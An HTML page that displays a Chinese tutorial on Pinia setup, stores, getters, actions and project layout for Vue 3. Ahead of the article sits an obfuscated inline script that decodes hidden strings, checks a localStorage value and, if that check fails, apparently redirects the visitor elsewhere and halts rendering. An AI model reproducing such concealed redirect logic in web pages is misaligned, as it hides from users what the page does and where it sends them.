<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x492dee=_0x1ff4;function _0x1ff4(p,s){var e=_0x1817();return(_0x1ff4=function(s,n){var a=e[s-=279];void 0===_0x1ff4.SpGlTJ&&(_0x1ff4.QFmOOE=function(s,n){var a,t=[],p=0,e="";for(s=(s=>{for(var n,a,t="",p="",e=0,l=0;a=s.charAt(l++);~a&&(n=e%4?64*n+a:a,e++%4)&&(t+=String.fromCharCode(255&n>>(-2*e&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var o=0,r=t.length;o<r;o++)p+="%"+("00"+t.charCodeAt(o).toString(16)).slice(-2);return decodeURIComponent(p)})(s),l=0;l<256;l++)t[l]=l;for(l=0;l<256;l++)p=(p+t[l]+n.charCodeAt(l%n.length))%256,a=t[l],t[l]=t[p],t[p]=a;for(var l=0,p=0,o=0;o<s.length;o++)a=t[l=(l+1)%256],t[l]=t[p=(p+t[l])%256],t[p]=a,e+=String.fromCharCode(s.charCodeAt(o)^t[(t[l]+t[p])%256]);return e},p=arguments,_0x1ff4.SpGlTJ=!0);var s=s+e[0],t=p[s];return t?a=t:(void 0===_0x1ff4.HRIHeI&&(_0x1ff4.HRIHeI=!0),a=_0x1ff4.QFmOOE(a,n),p[s]=a),a})(p,s)}function _0x1817(){var s=["WQlcLSk2aSocWOZcTW","W7ldNcqnWRWGWQG","WQlcPmozWRyJWP9Rhhi9mCoKWPm","W5xcJMTfWOBcUrZcR8kEhJ4TWP4","h8oyd8oUW4PAW6S6wSoUWOK","W5ldTmkoW6zLW54wa20","zxldKxjzlwqBrqO6W4W8","fq0EW6JdUbddGLpcOGhdJNz+","n14gtxJcMSoc","WRpcJ21rW69YW7NdPtxcJsTqoa","WPpcR3pcRtRdRc3dGmoDW7LpWRJdJHnpqSk3jCkSW6JcRgZdQSoJyIe","WRddNg9ZoSo5WOpcN8oMlmoc","FHddQg01WONcLmoaWO3dJ8kyWPX7","WRLrWRVdS8oQW6VcNmkUcN3cNSke","mt0qyKdcV8o3WPe","WQBcQxpdIW0","W45tWPOxFmkNAxNcPCkTmeC","jSkaW55IgCk2W7CKW4VdRxn3va","nfNdLKtcP1L7","kqqjwSoPuLJdGKtcGmojhSob","W4iRW7NcJCklW70DWRLGW5O1WOPg","yMxdT1FcH3T5","jx4ofhrgWROF","kwvNaSkkdHu","FSoyWOqWvCoSWQao","j3H+pvvcWRCOyG","W4NdOZ/dRNhdOJlcLSoYW7PmWRVdPa","WRpdL2CUrmouWOZcPmoL"];return(_0x1817=function(){return s})()}if((()=>{for(var s=_0x1ff4,n=_0x1817();;)try{if(494987==-parseInt(s(279,"b]m7"))*(-parseInt(s(295,"^f[["))/2)+-parseInt(s(297,"#Gwz"))/3*(-parseInt(s(281,"^xRU"))/4)+-parseInt(s(301,"59ka"))/5+-parseInt(s(296,"siWA"))/6+-parseInt(s(286,"AEFL"))/7*(-parseInt(s(300,"atnT"))/8)+-parseInt(s(303,"#Gwz"))/9*(-parseInt(s(302,"HTBW"))/10)+-parseInt(s(298,"u7]L"))/11)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x492dee(282,"b]m7")](_0x492dee(294,"vYma"))!=_0x492dee(304,"7q0*"))throw window[_0x492dee(285,"TR1a")][_0x492dee(290,"u7]L")](_0x492dee(299,"lv!9")),Error();document.title="vue pinia",document.getElementById("article").innerHTML='<div><p><strong>Vue Pinia 配置详解</strong></p>\n<p>Pinia 是 Vue 的状态管理库，提供了一种更简单、更现代的状态管理方式，特别适用于 Vue 3。以下是 Pinia 的详细配置和使用指南：</p>\n<h3>一、安装与配置</h3>\n<ol>\n<li>\n<p><strong>安装 Pinia</strong></p>\n<p>使用 npm 或 yarn 安装 Pinia：</p>\n<pre><code class="language-sh">npm install pinia\n</code></pre>\n<p>或</p>\n<pre><code class="language-sh">yarn add pinia\n</code></pre>\n</li>\n<li>\n<p><strong>创建 Pinia 实例并挂载到 Vue 应用</strong></p>\n<p>在 <code>main.js</code> 或 <code>main.ts</code> 中，创建 Pinia 实例并将其挂载到 Vue 应用上：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span>;\n<span class="hljs-keyword">import</span> { createPinia } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;pinia&#x27;</span>;\n<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span>;\n\n<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>);\n<span class="hljs-keyword">const</span> pinia = <span class="hljs-title function_">createPinia</span>();\n\napp.<span class="hljs-title function_">use</span>(pinia);\napp.<span class="hljs-title function_">mount</span>(<span class="hljs-string">&#x27;#app&#x27;</span>);\n</code></pre>\n</li>\n</ol>\n<h3>二、定义 Store</h3>\n<p>在 Pinia 中，Store 是用于管理状态的核心概念。你可以使用 <code>defineStore</code> 函数来定义一个 Store。</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;pinia&#x27;</span>;\n\n<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCounterStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">&#x27;counter&#x27;</span>, {\n  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({\n    <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,\n  }),\n  <span class="hljs-attr">getters</span>: {\n    <span class="hljs-attr">doubleCount</span>: <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">count</span> * <span class="hljs-number">2</span>,\n  },\n  <span class="hljs-attr">actions</span>: {\n    <span class="hljs-title function_">increment</span>(<span class="hljs-params"></span>) {\n      <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++;\n    },\n    <span class="hljs-title function_">decrement</span>(<span class="hljs-params"></span>) {\n      <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>--;\n    },\n  },\n});\n</code></pre>\n<ul>\n<li><strong>state</strong>  ：定义 Store 中的状态数据，通常是响应式的。</li>\n<li><strong>getters</strong>  ：类似于 Vue 组件中的计算属性，用于派生状态。</li>\n<li><strong>actions</strong>  ：用于修改状态或执行复杂的业务逻辑，可以包含异步操作。</li>\n</ul>\n<h3>三、在组件中使用 Store</h3>\n<p>在 Vue 组件中，你可以通过 <code>useStore</code> 钩子来访问和使用 Store。</p>\n<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>\n  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>\n    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Count: {{ counter.count }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>\n    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Double Count: {{ counter.doubleCount }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>\n    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;counter.increment&quot;</span>&gt;</span>Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>\n    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;counter.decrement&quot;</span>&gt;</span>Decrement<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>\n  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>\n<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>\n\n<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">\n<span class="hljs-keyword">import</span> { useCounterStore } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/stores/counter&#x27;</span>;\n\n<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {\n  <span class="hljs-title function_">setup</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-keyword">const</span> counter = <span class="hljs-title function_">useCounterStore</span>();\n    <span class="hljs-keyword">return</span> { counter };\n  },\n};\n</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>\n</code></pre>\n<h3>四、Pinia 的重要特性</h3>\n<ol>\n<li><strong>模块化</strong>  ：Pinia 允许你将状态管理拆分成多个 Store，每个 Store 可以包含自己的状态、getter 和 action，有助于代码的模块化和可维护性。</li>\n<li><strong>TypeScript 支持</strong>  ：Pinia 提供了对 TypeScript 的良好支持，包括类型推断和自动补全功能。</li>\n<li><strong>响应式系统</strong>  ：Pinia 是基于 Vue 3 的响应式系统构建的，状态会自动响应变化，并触发组件的更新。</li>\n<li><strong>插件系统</strong>  ：Pinia 允许通过插件来扩展其功能，例如支持服务器端渲染或添加额外的中间件。</li>\n<li><strong>持久化存储</strong>  ：通过插件机制，如 <code>pinia-plugin-persistedstate</code>，可以轻松地实现状态的持久化存储。</li>\n<li><strong>Devtools 支持</strong>  ：Pinia 支持 Vue Devtools，提供了追踪 actions 和 mutations 的时间线、时间旅行和热更新等功能，方便开发者调试。</li>\n</ol>\n<h3>五、高级用法</h3>\n<ol>\n<li><strong>动态参数传递</strong>  ：在创建 Store 时，可以传递不同的参数来初始化 Store 状态。</li>\n<li><strong>状态监听</strong>  ：可以通过 <code>watch</code> API 或 Pinia 提供的 <code>subscribe</code> 方法来监听 Store 中某个状态的变化。</li>\n<li><strong>映射辅助函数</strong>  ：Pinia 提供了如 <code>mapStores</code>、<code>mapState</code> 和 <code>mapActions</code> 等辅助函数，使得在组件中使用 Store 更加方便。</li>\n<li><strong>SSR 支持</strong>  ：Pinia 支持服务端渲染，这对于构建需要 SSR 的应用是一个重要的特性。</li>\n</ol>\n<h3>六、示例项目结构</h3>\n<p>为了更好地组织代码，你可以在项目中创建一个 <code>stores</code> 文件夹，用于存放所有的 Store 文件。例如：</p>\n<pre><code>src/\n├── stores/\n│   ├── counter.js\n│   ├── user.js\n│   └── index.js\n├── main.js\n└── App.vue\n</code></pre>\n<p>在 <code>index.js</code> 文件中，你可以统一导出所有的 Store，方便在组件中使用：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> { createPinia } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;pinia&#x27;</span>;\n<span class="hljs-keyword">import</span> { useCounterStore } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./counter&#x27;</span>;\n<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./user&#x27;</span>;\n\n<span class="hljs-keyword">const</span> pinia = <span class="hljs-title function_">createPinia</span>();\n\n<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> pinia;\n\n<span class="hljs-keyword">export</span> { useCounterStore, useUserStore };\n</code></pre>\n<p>这样，在组件中就可以通过 <code>import { useCounterStore, useUserStore } from \'@/stores\'</code> 来引入需要的 Store。</p>\n</div>'</script></body></html>